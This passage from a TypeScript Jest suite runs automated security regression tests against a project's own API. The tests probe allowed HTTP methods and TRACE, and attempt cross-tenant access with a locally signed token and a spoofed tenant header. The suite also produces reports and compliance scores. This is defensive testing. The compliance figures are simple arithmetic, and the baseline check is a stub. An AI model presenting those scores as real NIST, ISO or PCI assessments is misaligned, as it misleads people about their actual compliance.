        let allowedMethods = 0;

        for (const method of methods) {
          try {
            const response = await fetch(`${this.baseURL}${endpoint}`, {
              method,
              headers: { 'Content-Type': 'application/json' }
            });

            if (response.status !== 405 && response.status !== 501) {
              allowedMethods++;
              
              // TRACE method should never be allowed
              if (method === 'TRACE' && response.status === 200) {
                vulnerabilities.push({
                  id: crypto.randomUUID(),
                  title: `TRACE method enabled on ${endpoint}`,
                  severity: 'MEDIUM',
                  description: 'HTTP TRACE method is enabled',
                  location: endpoint,
                  impact: 'Cross-site tracing (XST) attacks',
                  remediation: 'Disable TRACE method on web server',
                  confidence: 100,
                  falsePositive: false,
                  newInThisRun: !this.wasVulnerabilityInPrevious('trace-' + endpoint),
                  resolvedFromPrevious: false
                });
                score -= 10;
              }
            }
          } catch (error) {
            // Connection errors don't indicate vulnerabilities
          }
        }

        // Check for overly permissive method handling
        if (allowedMethods > 4) {
          vulnerabilities.push({
            id: crypto.randomUUID(),
            title: `Too many HTTP methods allowed on ${endpoint}`,
            severity: 'LOW',
            description: `${allowedMethods} HTTP methods accepted`,
            location: endpoint,
            impact: 'Increased attack surface',
            remediation: 'Restrict HTTP methods to only those required',
            confidence: 70,
            falsePositive: false,
            newInThisRun: !this.wasVulnerabilityInPrevious('methods-' + endpoint),
            resolvedFromPrevious: false
          });
          score -= 5;
        }
      }

    } catch (error) {
      console.warn('API security regression test failed:', error);
    }

    const executionTime = Date.now() - startTime;
    const newVulns = vulnerabilities.filter(v => v.newInThisRun).length;

    return {
      testId: 'api-001',
      passed: vulnerabilities.filter(v => v.severity === 'HIGH' || v.severity === 'CRITICAL').length === 0,
      score: Math.max(0, score),
      vulnerabilities,
      metrics: {
        vulnerabilityCount: this.countVulnerabilities(vulnerabilities),
        securityScore: Math.max(0, score),
        regressionDetected: newVulns > 0,
        newVulnerabilities: newVulns,
        resolvedVulnerabilities: 0,
        coverageMetrics: {
          endpointsCovered: 5,
          totalEndpoints: 50,
          coveragePercentage: 10
        },
        complianceScore: Math.max(0, score)
      },
      timestamp: new Date().toISOString(),
      executionTimeMs: executionTime,
      environment: this.environment
    };
  }

  // Tenant Isolation Testing
  private async testTenantIsolation(): Promise<SecurityTestResult> {
    const startTime = Date.now();
    const vulnerabilities: VulnerabilityFinding[] = [];
    let score = 100;

    // Test cross-tenant data access
    try {
      const tenant1Token = this.generateUserJWT('user1', ['user'], 'tenant-001');
      const tenant2Token = this.generateUserJWT('user2', ['user'], 'tenant-002');

      // Test accessing tenant-specific resources with wrong tenant token
      const crossTenantEndpoints = [
        '/api/tenants/tenant-002/assets',
        '/api/assets' // with tenant context in headers
      ];

      for (const endpoint of crossTenantEndpoints) {
        const response = await fetch(`${this.baseURL}${endpoint}`, {
          method: 'GET',
          headers: {
            'Authorization': `Bearer ${tenant1Token}`,
            'X-Tenant-ID': 'tenant-002',
            'Content-Type': 'application/json'
          }
        });

        if (response.status === 200) {
          vulnerabilities.push({
            id: crypto.randomUUID(),
            title: `Cross-tenant data access on ${endpoint}`,
            severity: 'CRITICAL',
            description: 'User can access data from different tenant',
            location: endpoint,
            impact: 'Complete tenant isolation bypass, data breach',
            remediation: 'Implement proper tenant context validation',
            confidence: 95,
            falsePositive: false,
            newInThisRun: !this.wasVulnerabilityInPrevious('tenant-isolation-' + endpoint),
            resolvedFromPrevious: false
          });
          score -= 30;
        }
      }

    } catch (error) {
      console.warn('Tenant isolation test failed:', error);
    }

    const executionTime = Date.now() - startTime;
    const newVulns = vulnerabilities.filter(v => v.newInThisRun).length;

    return {
      testId: 'tenant-001',
      passed: vulnerabilities.filter(v => v.severity === 'CRITICAL').length === 0,
      score: Math.max(0, score),
      vulnerabilities,
      metrics: {
        vulnerabilityCount: this.countVulnerabilities(vulnerabilities),
        securityScore: Math.max(0, score),
        regressionDetected: newVulns > 0,
        newVulnerabilities: newVulns,
        resolvedVulnerabilities: 0,
        coverageMetrics: {
          endpointsCovered: 2,
          totalEndpoints: 10,
          coveragePercentage: 20
        },
        complianceScore: Math.max(0, score)
      },
      timestamp: new Date().toISOString(),
      executionTimeMs: executionTime,
      environment: this.environment
    };
  }

  // Run all security regression tests
  async runSecurityRegressionTests(): Promise<RegressionTestReport> {
    console.log('🔒 Starting security regression testing...');
    console.log(`🏗️ Environment: ${this.environment}`);
    console.log(`🌐 Base URL: ${this.baseURL}`);
    console.log(`📝 Build ID: ${this.buildId}`);
    console.log(`📊 Commit: ${this.commitHash}`);
    console.log(`🌿 Branch: ${this.branch}`);

    const testResults: SecurityTestResult[] = [];
    const enabledTests = this.regressionTests.filter(t => t.enabled);

    console.log(`🧪 Running ${enabledTests.length} security regression tests...`);

    for (let i = 0; i < enabledTests.length; i++) {
      const test = enabledTests[i];
      console.log(`[${i + 1}/${enabledTests.length}] Running ${test.name}...`);
      
      try {
        const result = await test.testFunction();
        testResults.push(result);
        
        const status = result.passed ? '✅' : '❌';
        const newVulnsText = result.metrics.newVulnerabilities > 0 ? 
          ` (🚨 ${result.metrics.newVulnerabilities} new vulnerabilities)` : '';
        
        console.log(`${status} ${test.name} - Score: ${result.score}/100${newVulnsText}`);
        
        if (result.vulnerabilities.length > 0) {
          result.vulnerabilities.forEach(vuln => {
            console.log(`  ${vuln.severity === 'CRITICAL' ? '🔥' : vuln.severity === 'HIGH' ? '⚠️' : '💡'} ${vuln.title}`);
          });
        }
        
      } catch (error) {
        console.error(`❌ ${test.name} failed:`, error);
        
        testResults.push({
          testId: test.id,
          passed: false,
          score: 0,
          vulnerabilities: [{
            id: crypto.randomUUID(),
            title: `Test execution failure: ${test.name}`,
            severity: 'HIGH',
            description: `Security test failed to execute: ${error}`,
            location: 'Test execution',
            impact: 'Unable to validate security controls',
            remediation: 'Fix test execution environment and retry',
            confidence: 100,
            falsePositive: false,
            newInThisRun: true,
            resolvedFromPrevious: false
          }],
          metrics: {
            vulnerabilityCount: { critical: 0, high: 1, medium: 0, low: 0, total: 1 },
            securityScore: 0,
            regressionDetected: true,
            newVulnerabilities: 1,
            resolvedVulnerabilities: 0,
            coverageMetrics: { endpointsCovered: 0, totalEndpoints: 0, coveragePercentage: 0 },
            complianceScore: 0
          },
          timestamp: new Date().toISOString(),
          executionTimeMs: 0,
          environment: this.environment
        });
      }
    }

    // Generate comprehensive report
    const report = this.generateRegressionTestReport(testResults);
    
    // Save results for future comparison
    await this.saveResultsAsBaseline(report);
    
    return report;
  }

  private generateRegressionTestReport(testResults: SecurityTestResult[]): RegressionTestReport {
    const totalTests = testResults.length;
    const passed = testResults.filter(r => r.passed).length;
    const failed = totalTests - passed;
    
    const allVulnerabilities = testResults.flatMap(r => r.vulnerabilities);
    const newVulnerabilities = allVulnerabilities.filter(v => v.newInThisRun).length;
    const resolvedVulnerabilities = allVulnerabilities.filter(v => v.resolvedFromPrevious).length;
    const criticalIssues = allVulnerabilities.filter(v => v.severity === 'CRITICAL').length;
    
    const overallScore = testResults.reduce((sum, r) => sum + r.score, 0) / totalTests;
    const regressionDetected = testResults.some(r => r.metrics.regressionDetected);
    
    const complianceFrameworks = ['NIST CSF', 'ISO 27001', 'SOC 2', 'GDPR', 'PCI DSS'];
    const complianceStatus: any = {};
    
    complianceFrameworks.forEach(framework => {
      const score = Math.max(0, overallScore - (criticalIssues * 15) - (newVulnerabilities * 10));
      complianceStatus[framework] = {
        score,
        status: score >= 80 ? 'PASS' : score >= 60 ? 'WARNING' : 'FAIL',
        requirements: this.getComplianceRequirements(framework, allVulnerabilities)
      };
    });

    return {
      timestamp: new Date().toISOString(),
      buildId: this.buildId,
      commitHash: this.commitHash,
      branch: this.branch,
      environment: this.environment,
      testResults,
      overallScore,
      regressionDetected,
      summary: {
        totalTests,
        passed,
        failed,
        newVulnerabilities,
        resolvedVulnerabilities,
        criticalIssues
      },
      recommendations: this.generateRecommendations(testResults),
      complianceStatus,
      actionRequired: criticalIssues > 0 || regressionDetected,
      blockDeployment: criticalIssues > 0 || (regressionDetected && this.environment === 'production')
    };
  }

  private generateRecommendations(testResults: SecurityTestResult[]): string[] {
    const recommendations: string[] = [];
    
    const criticalVulns = testResults.flatMap(r => r.vulnerabilities.filter(v => v.severity === 'CRITICAL'));
    const highVulns = testResults.flatMap(r => r.vulnerabilities.filter(v => v.severity === 'HIGH'));
    
    if (criticalVulns.length > 0) {
      recommendations.push(`🔥 IMMEDIATE ACTION REQUIRED: Address ${criticalVulns.length} critical security vulnerabilities`);
      recommendations.push('Block deployment until all critical issues are resolved');
    }
    
    if (highVulns.length > 0) {
      recommendations.push(`⚠️ Address ${highVulns.length} high-severity vulnerabilities within 24 hours`);
    }

    const newVulns = testResults.flatMap(r => r.vulnerabilities.filter(v => v.newInThisRun));
    if (newVulns.length > 0) {
      recommendations.push(`🚨 Security regression detected: ${newVulns.length} new vulnerabilities introduced`);
    }

    const failedTests = testResults.filter(r => !r.passed);
    if (failedTests.length > 0) {
      recommendations.push(`Fix ${failedTests.length} failing security tests`);
    }

    // Performance recommendations
    const slowTests = testResults.filter(r => r.executionTimeMs > 30000); // 30 seconds
    if (slowTests.length > 0) {
      recommendations.push(`Optimize ${slowTests.length} slow-running security tests`);
    }

    recommendations.push('Update security testing baseline with current results');
    recommendations.push('Review and update security monitoring and alerting');
    
    return recommendations;
  }

  private getComplianceRequirements(framework: string, vulnerabilities: VulnerabilityFinding[]): string[] {
    const requirements: string[] = [];
    
    const criticalCount = vulnerabilities.filter(v => v.severity === 'CRITICAL').length;
    const highCount = vulnerabilities.filter(v => v.severity === 'HIGH').length;
    
    switch (framework) {
      case 'NIST CSF':
        if (criticalCount > 0) requirements.push('PR.AC - Access Control');
        if (highCount > 0) requirements.push('PR.DS - Data Security');
        break;
      case 'ISO 27001':
        if (criticalCount > 0) requirements.push('A.9 - Access Control');
        if (highCount > 0) requirements.push('A.14 - System Acquisition');
        break;
      case 'SOC 2':
        if (criticalCount > 0) requirements.push('CC6 - Logical Access');
        break;
      case 'PCI DSS':
        if (criticalCount > 0) requirements.push('Requirement 6 - Secure Systems');
        break;
    }
    
    return requirements;
  }

  private async saveResultsAsBaseline(report: RegressionTestReport): Promise<void> {
    try {
      const baselinePath = path.join(__dirname, '../../test-results/security-regression-baseline.json');
      fs.mkdirSync(path.dirname(baselinePath), { recursive: true });
      fs.writeFileSync(baselinePath, JSON.stringify(report, null, 2));
      
      // Also save detailed report
      const reportPath = path.join(__dirname, `../../test-results/security-regression-report-${this.buildId}.json`);
      fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
      
      console.log(`💾 Security regression results saved:`);
      console.log(`  Baseline: ${baselinePath}`);
      console.log(`  Report: ${reportPath}`);
      
    } catch (error) {
      console.error('Failed to save security regression results:', error);
    }
  }

  // Utility methods
  private generateExpiredJWT(): string {
    const payload = {
      sub: 'test-user',
      tenantId: 'tenant-001',
      roles: ['user'],
      iat: Math.floor(Date.now() / 1000) - 3600, // 1 hour ago
      exp: Math.floor(Date.now() / 1000) - 1800   // 30 minutes ago (expired)
    };
    return jwt.sign(payload, 'test-secret');
  }

  private generateUserJWT(userId: string, roles: string[], tenantId: string = 'tenant-001'): string {
    const payload = {
      sub: userId,
      tenantId,
      roles,
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600 // 1 hour from now
    };
    return jwt.sign(payload, 'test-secret');
  }

  private wasVulnerabilityInPrevious(vulnKey: string): boolean {
    // Check if this vulnerability was present in previous test run
    // This would be more sophisticated in a real implementation
    return false; // For now, treat all as new
  }

  private mapSeverity(severity: string): 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL' {
    const sev = severity.toUpperCase();
    if (['LOW', 'MINOR'].includes(sev)) return 'LOW';
    if (['MEDIUM', 'MODERATE'].includes(sev)) return 'MEDIUM';
    if (['HIGH', 'MAJOR'].includes(sev)) return 'HIGH';
    if (['CRITICAL', 'SEVERE'].includes(sev)) return 'CRITICAL';
    return 'MEDIUM';
  }

  private countVulnerabilities(vulnerabilities: VulnerabilityFinding[]) {
    return {
      critical: vulnerabilities.filter(v => v.severity === 'CRITICAL').length,
      high: vulnerabilities.filter(v => v.severity === 'HIGH').length,
      medium: vulnerabilities.filter(v => v.severity === 'MEDIUM').length,
      low: vulnerabilities.filter(v => v.severity === 'LOW').length,
      total: vulnerabilities.length
    };
  }
}

describe('🔒 Security Regression Testing Automation', () => {
  let regressionTester: SecurityRegressionAutomation;

  beforeAll(() => {
    regressionTester = new SecurityRegressionAutomation(process.env.TEST_ENVIRONMENT || 'ci');
  });

  test('should run comprehensive security regression test suite', async () => {
    const report = await regressionTester.runSecurityRegressionTests();
    
    expect(report.summary.totalTests).toBeGreaterThan(5);
    expect(report.overallScore).toBeDefined();
    expect(report.complianceStatus).toBeDefined();
    
    // Critical vulnerabilities should block deployment
    if (report.summary.criticalIssues > 0) {
      expect(report.blockDeployment).toBe(true);
    }
    
    // No critical security regressions allowed
    expect(report.summary.criticalIssues).toBe(0);
    
    console.log(`🔒 Security Regression Test Results:`);
    console.log(`  Overall Score: ${report.overallScore.toFixed(2)}/100`);
    console.log(`  Tests Passed: ${report.summary.passed}/${report.summary.totalTests}`);
    console.log(`  Critical Issues: ${report.summary.criticalIssues}`);
    console.log(`  New Vulnerabilities: ${report.summary.newVulnerabilities}`);
    console.log(`  Regression Detected: ${report.regressionDetected ? 'YES' : 'NO'}`);
    console.log(`  Block Deployment: ${report.blockDeployment ? 'YES' : 'NO'}`);
    
    // Log compliance status
    Object.entries(report.complianceStatus).forEach(([framework, status]) => {
      console.log(`  ${framework}: ${(status as any).status} (${(status as any).score.toFixed(1)}/100)`);
    });
    
  }, 600000); // 10 minute timeout for comprehensive testing

  test('should detect and report security regressions', async () => {
    const report = await regressionTester.runSecurityRegressionTests();
    
    expect(report.regressionDetected).toBeDefined();
    
    if (report.regressionDetected) {
      expect(report.summary.newVulnerabilities).toBeGreaterThan(0);
      expect(report.actionRequired).toBe(true);
      
      console.log(`🚨 Security Regression Detected:`);
      console.log(`  New Vulnerabilities: ${report.summary.newVulnerabilities}`);
    } else {
      console.log(`✅ No Security Regressions Detected`);
    }
  });

  test('should validate compliance requirements', async () => {
    const report = await regressionTester.runSecurityRegressionTests();
    
    const frameworks = Object.keys(report.complianceStatus);
    expect(frameworks.length).toBeGreaterThan(0);
    
    // Check that at least some frameworks pass
    const passingFrameworks = frameworks.filter(f => 
      (report.complianceStatus[f] as any).status === 'PASS'
    );
    
    expect(passingFrameworks.length).toBeGreaterThan(0);
    
    console.log(`📋 Compliance Status:`);
    frameworks.forEach(framework => {
      const status = report.complianceStatus[framework] as any;
      console.log(`  ${framework}: ${status.status} (${status.score.toFixed(1)}/100)`);
    });
  });

  test('should provide actionable recommendations', async () => {
    const report = await regressionTester.runSecurityRegressionTests();
    
    expect(Array.isArray(report.recommendations)).toBe(true);
    expect(report.recommendations.length).toBeGreaterThan(0);
    
    console.log(`📝 Security Recommendations:`);
    report.recommendations.forEach((rec, index) => {
      console.log(`  ${index + 1}. ${rec}`);
    });
  });

  test('should integrate with CI/CD pipeline', async () => {
    const report = await regressionTester.runSecurityRegressionTests();
    
    // Verify CI/CD integration metadata
    expect(report.buildId).toBeDefined();
    expect(report.commitHash).toBeDefined();
    expect(report.branch).toBeDefined();
    expect(report.environment).toBeDefined();
    
    // Check deployment blocking logic
    if (report.summary.criticalIssues > 0) {
      expect(report.blockDeployment).toBe(true);
      
      // In CI/CD pipeline, this would trigger failure
      if (process.env.CI === 'true') {
        console.error('🚨 DEPLOYMENT BLOCKED: Critical security issues detected');
        // process.exit(1); // Would fail the CI/CD build
      }
    }
    
    console.log(`🔧 CI/CD Integration Status:`);
    console.log(`  Build ID: ${report.buildId}`);
    console.log(`  Commit: ${report.commitHash.substring(0, 8)}`);
    console.log(`  Branch: ${report.branch}`);
    console.log(`  Environment: ${report.environment}`);
    console.log(`  Action Required: ${report.actionRequired ? 'YES' : 'NO'}`);
  });
});